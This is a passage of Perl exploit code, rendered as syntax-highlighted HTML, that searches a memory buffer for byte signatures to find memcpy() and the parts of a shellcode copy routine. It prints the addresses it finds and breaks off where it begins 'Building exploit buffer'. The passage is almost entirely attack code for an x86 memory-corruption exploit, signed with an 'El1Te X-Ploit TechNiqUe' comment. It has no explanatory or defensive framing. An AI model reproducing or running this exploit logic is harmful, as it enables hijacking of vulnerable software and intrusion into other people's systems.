class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">printf</code> <code class="string">"memcpy is located at %08x\n"</code><code class="plain">, </code><code class="variable">$memcpy</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">} </code><code class="keyword">else</code> <code class="plain">{</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">if</code> <code class="plain">((</code><code class="variable">$v</code> <code class="plain">= </code><code class="functions">index</code> <code class="variable">$buff</code><code class="plain">, </code><code class="string">"\x89\x7C\x24\x04\x89\x1C\x24\x89\x44\x24\x08"</code><code class="plain">) &gt;= 0) {</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$addr1</code> <code class="plain">= </code><code class="variable">$k</code><code class="plain">+</code><code class="variable">$v</code><code class="plain">+15;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$memcpy</code> <code class="plain">= </code><code class="functions">unpack</code><code class="plain">(</code><code class="string">"I"</code><code class="plain">, </code><code class="functions">substr</code><code class="plain">(</code><code class="variable">$buff</code><code class="plain">, </code><code class="variable">$v</code><code class="plain">+12, 4));</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$memcpy</code> <code class="plain">= </code><code class="variable">$addr1</code> <code class="plain">- (0xffffffff-</code><code class="variable">$memcpy</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">printf</code> <code class="string">"memcpy is located at %08x\n"</code><code class="plain">, </code><code class="variable">$memcpy</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}&nbsp;&nbsp;&nbsp; </code><code class="keyword">else</code> <code class="plain">{</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">if</code> <code class="plain">((</code><code class="variable">$v</code> <code class="plain">= </code><code class="functions">index</code> <code class="variable">$buff</code><code class="plain">, </code><code class="string">"\x8B\x55\x10\x89\x74\x24\x04\x89\x04\x24\x89\x54\x24\x08"</code><code class="plain">) &gt;= 0) {</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$addr1</code> <code class="plain">= </code><code class="variable">$k</code><code class="plain">+</code><code class="variable">$v</code><code class="plain">+18;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$memcpy</code> <code class="plain">= </code><code class="functions">unpack</code><code class="plain">(</code><code class="string">"I"</code><code class="plain">, </code><code class="functions">substr</code><code class="plain">(</code><code class="variable">$buff</code><code class="plain">, </code><code class="variable">$v</code><code class="plain">+15, 4));</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$memcpy</code> <code class="plain">= </code><code class="variable">$addr1</code> <code class="plain">- (0xffffffff-</code><code class="variable">$memcpy</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">printf</code> <code class="string">"memcpy is located at %08x\n"</code><code class="plain">, </code><code class="variable">$memcpy</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">} </code><code class="keyword">else</code> <code class="plain">{</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="string">"Could not find memcpy()\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">exit</code><code class="plain">;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">if</code> <code class="plain">((</code><code class="variable">$v</code> <code class="plain">= </code><code class="functions">index</code> <code class="variable">$buff</code><code class="plain">, </code><code class="string">"\xfc\x8b"</code><code class="plain">) &gt;= 0) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$byte1</code> <code class="plain">= </code><code class="variable">$k</code><code class="plain">+</code><code class="variable">$v</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">printf</code> <code class="plain">(</code><code class="string">"byte1: %08x\n"</code><code class="plain">, </code><code class="variable">$byte1</code><code class="plain">);&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">} </code><code class="keyword">else</code> <code class="plain">{</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="string">"Could not find a special byte\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">exit</code><code class="plain">;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">if</code> <code class="plain">((</code><code class="variable">$v</code> <code class="plain">= </code><code class="functions">index</code> <code class="variable">$buff</code><code class="plain">, </code><code class="string">"\xf4"</code><code class="plain">) &gt;= 0) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$byte2</code> <code class="plain">= </code><code class="variable">$k</code><code class="plain">+</code><code class="variable">$v</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">printf</code> <code class="plain">(</code><code class="string">"byte2: %08x\n"</code><code class="plain">, </code><code class="variable">$byte2</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">} </code><code class="keyword">else</code> <code class="plain">{</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="string">"Could not find a special byte\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">exit</code><code class="plain">;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">if</code> <code class="plain">((</code><code class="variable">$v</code> <code class="plain">= </code><code class="functions">index</code> <code class="variable">$buff</code><code class="plain">, </code><code class="string">"\xbf"</code><code class="plain">) &gt;= 0) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$byte3</code> <code class="plain">= </code><code class="variable">$k</code><code class="plain">+</code><code class="variable">$v</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">printf</code> <code class="plain">(</code><code class="string">"byte3: %08x\n"</code><code class="plain">, </code><code class="variable">$byte3</code><code class="plain">);&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">} </code><code class="keyword">else</code> <code class="plain">{</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="string">"Could not find a special byte\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">exit</code><code class="plain">;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">if</code> <code class="plain">((</code><code class="variable">$v</code> <code class="plain">= </code><code class="functions">index</code> <code class="variable">$buff</code><code class="plain">, </code><code class="string">"\x00\x01\x00"</code><code class="plain">) &gt;= 0) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$byte4</code> <code class="plain">= </code><code class="variable">$k</code><code class="plain">+</code><code class="variable">$v</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">printf</code> <code class="plain">(</code><code class="string">"byte4: %08x\n"</code><code class="plain">, </code><code class="variable">$byte4</code><code class="plain">);&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">} </code><code class="keyword">else</code> <code class="plain">{</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="string">"Could not find a special byte\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">exit</code><code class="plain">;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">if</code> <code class="plain">((</code><code class="variable">$v</code> <code class="plain">= </code><code class="functions">index</code> <code class="variable">$buff</code><code class="plain">, </code><code class="string">"\x10"</code><code class="plain">) &gt;= 0) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$byte5</code> <code class="plain">= </code><code class="variable">$k</code><code class="plain">+</code><code class="variable">$v</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">printf</code> <code class="plain">(</code><code class="string">"byte5: %08x\n"</code><code class="plain">, </code><code class="variable">$byte5</code><code class="plain">);&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">} </code><code class="keyword">else</code> <code class="plain">{</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="string">"Could not find a special byte\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">exit</code><code class="plain">;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">if</code> <code class="plain">((</code><code class="variable">$v</code> <code class="plain">= </code><code class="functions">index</code> <code class="variable">$buff</code><code class="plain">, </code><code class="string">"\xB9\x00\x02\x00\x00"</code><code class="plain">) &gt;= 0) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$byte6</code> <code class="plain">= </code><code class="variable">$k</code><code class="plain">+</code><code class="variable">$v</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">printf</code> <code class="plain">(</code><code class="string">"byte6: %08x\n"</code><code class="plain">, </code><code class="variable">$byte6</code><code class="plain">);&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">} </code><code class="keyword">else</code> <code class="plain">{</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="string">"Could not find a special byte\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">exit</code><code class="plain">;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">if</code> <code class="plain">((</code><code class="variable">$v</code> <code class="plain">= </code><code class="functions">index</code> <code class="variable">$buff</code><code class="plain">, </code><code class="string">"\xf3"</code><code class="plain">) &gt;= 0) {</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$byte7</code> <code class="plain">= </code><code class="variable">$k</code><code class="plain">+</code><code class="variable">$v</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">printf</code> <code class="plain">(</code><code class="string">"byte7: %08x\n"</code><code class="plain">, </code><code class="variable">$byte7</code><code class="plain">);&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">} </code><code class="keyword">else</code> <code class="plain">{</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="string">"Could not find a special byte\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">exit</code><code class="plain">;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">if</code> <code class="plain">((</code><code class="variable">$v</code> <code class="plain">= </code><code class="functions">index</code> <code class="variable">$buff</code><code class="plain">, </code><code class="string">"\xA4"</code><code class="plain">) &gt;= 0) {</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$byte8</code> <code class="plain">= </code><code class="variable">$k</code><code class="plain">+</code><code class="variable">$v</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">printf</code> <code class="plain">(</code><code class="string">"byte8: %08x\n"</code><code class="plain">, </code><code class="variable">$byte8</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">} </code><code class="keyword">else</code> <code class="plain">{</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="string">"Could not find a special byte\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">exit</code><code class="plain">;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">if</code> <code class="plain">((</code><code class="variable">$v</code> <code class="plain">= </code><code class="functions">index</code> <code class="variable">$buff</code><code class="plain">, </code><code class="string">"\xeb\xff"</code><code class="plain">) &gt;= 0) {</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$byte9</code> <code class="plain">= </code><code class="variable">$k</code><code class="plain">+</code><code class="variable">$v</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">printf</code> <code class="plain">(</code><code class="string">"byte9: %08x\n"</code><code class="plain">, </code><code class="variable">$byte9</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">} </code><code class="keyword">else</code> <code class="plain">{</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="string">"Could not find a special byte\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">exit</code><code class="plain">;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="comments"># shellcode copy routine:</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="comments">#0100740B&nbsp;&nbsp;&nbsp;&nbsp; FC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CLD</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="comments">#0100740C&nbsp;&nbsp;&nbsp;&nbsp; 8BF4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MOV ESI,ESP</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="comments">#0100740E&nbsp;&nbsp;&nbsp;&nbsp; BF 00010010&nbsp;&nbsp;&nbsp; MOV EDI,10000100</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="comments">#01007413&nbsp;&nbsp;&nbsp;&nbsp; B9 00020000&nbsp;&nbsp;&nbsp; MOV ECX,200</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="comments">#01007418&nbsp;&nbsp;&nbsp;&nbsp; F3:A4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; REP MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[&gt;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="comments">#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; EB FF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; JMP +0xFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="comments"># FC 8B </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="comments"># F4 BF</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="comments"># 00 01 00</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="comments"># 10</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="comments"># B9 00 02 00 00</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="comments"># F3:A4</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="comments"># EB FF</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="comments"># El1Te X-Ploit TechNiqUe (C)</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="string">"Building exploit buffer\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line 